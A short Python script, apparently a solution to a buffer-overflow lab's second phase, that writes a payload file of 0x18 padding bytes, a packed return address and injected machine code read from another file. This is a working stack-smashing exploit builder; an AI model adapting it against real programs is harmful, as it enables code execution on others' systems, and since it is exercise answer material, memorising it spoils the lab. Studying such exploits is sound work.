import struct

with open("phase2_payload.bin", "wb") as outfile, open(
    "phase2_code.bin", "rb"
) as infile:
    outfile.write(b"A" * 0x18)
    outfile.write(struct.pack("<q", 0x55629F48))
    outfile.write(infile.read())
